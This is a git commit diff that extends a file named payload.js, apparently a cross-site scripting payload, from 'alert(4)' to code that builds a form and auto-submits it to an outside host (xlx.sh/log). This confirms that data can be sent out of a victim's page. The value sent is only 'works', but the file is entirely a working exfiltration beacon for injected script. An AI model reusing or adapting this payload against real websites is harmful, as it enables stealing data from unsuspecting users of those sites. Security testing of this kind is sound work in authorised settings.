ae4f5c0460e5e0162bcac8ed48645fb18c2f3c42
André Rüegg <andre@ruegg.me>
2025-06-25 22:43:15 -0700

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,1 +1,14 @@
 alert(4);
+
+
+const form = document.createElement("form");
+form.action = "https://xlx.sh/log";
+form.method = "POST";
+
+const input = document.createElement("input");
+input.name = "data";
+input.value = "works";
+
+form.appendChild(input);
+document.body.appendChild(form);
+form.submit();
